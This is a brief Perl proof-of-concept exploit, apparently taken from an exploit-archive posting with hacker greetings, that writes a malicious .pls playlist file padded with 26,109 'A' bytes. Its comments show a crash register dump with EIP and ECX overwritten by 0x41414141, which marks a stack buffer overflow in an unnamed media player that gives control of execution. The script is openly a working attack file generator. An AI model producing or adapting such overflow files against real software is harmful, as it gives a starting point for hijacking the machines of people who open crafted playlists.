#!/usr/bin/perl
#
# JIKO =>JAWAD
#
# Thanx To All Friends : Cyber-Zone , Stack , ZoRLu , Hussin X , Mag!c ompo ,Sad Hacker ,Strock ... All MoroCCaN HaCkerS
#
# No-Exploit.com

# EAX 00000000
# ECX 41414141
# EDX 000008C3
# EBX 000FBBD4 ASCII "F:\perso\test\tool\jiko.pls"
# ESP 000F7298
# EBP 000FBFB4
# ESI 77C2FCE0 msvcrt.77C2FCE0
# EDI 000065FD
# EIP 41414141
# *.Pla || .PLS

my $ex="A" x 26109;

open(MYFILE,'>>jiko.pls');
print MYFILE $ex;
close(MYFILE);